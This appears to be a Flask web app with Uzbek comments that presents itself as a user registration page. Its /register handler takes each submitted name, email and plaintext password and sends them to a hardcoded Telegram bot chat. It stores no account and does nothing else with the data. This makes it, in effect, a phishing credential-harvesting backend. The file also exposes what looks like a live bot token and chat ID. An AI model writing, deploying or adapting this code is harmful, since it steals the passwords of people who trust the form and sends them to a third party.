from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# Telegram konfiguratsiya
BOT_TOKEN = '8546698852:AAGYApyPVKHfu2bpTBsmsoHHyzkchSHvfmo'
CHAT_ID = '6583662918'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    name = data.get('name', '').strip()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()

    # Validatsiya
    if len(name) < 2 or len(name) > 50:
        return jsonify(success=False, message="Ism 2-50 belgidan bo'lishi kerak")
    if len(password) < 6 or len(password) > 100:
        return jsonify(success=False, message="Parol 6-100 belgidan bo'lishi kerak")
    import re
    email_regex = r"^[^\s@]+@[^\s@]+\.[^\s@]+$"
    if not re.match(email_regex, email):
        return jsonify(success=False, message="Email noto'g'ri")

    # Telegram xabarini tayyorlash
    message = f"""
🆕 <b>YANGI RO'YXATDAN O'TISH</b>

👤 <b>Ism:</b> {name}
📧 <b>Email:</b> {email}
🔐 <b>Parol:</b> {password}
🕒 <b>Vaqt:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

    try:
        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        resp = requests.post(tg_url, json={"chat_id": CHAT_ID, "text": message, "parse_mode":"HTML"})
        result = resp.json()
        if result.get("ok"):
            return jsonify(success=True)
        else:
            return jsonify(success=False, message=result.get("description","Xatolik yuz berdi"))
    except Exception as e:
        return jsonify(success=False, message=str(e))

if __name__ == '__main__':
    app.run(debug=True)
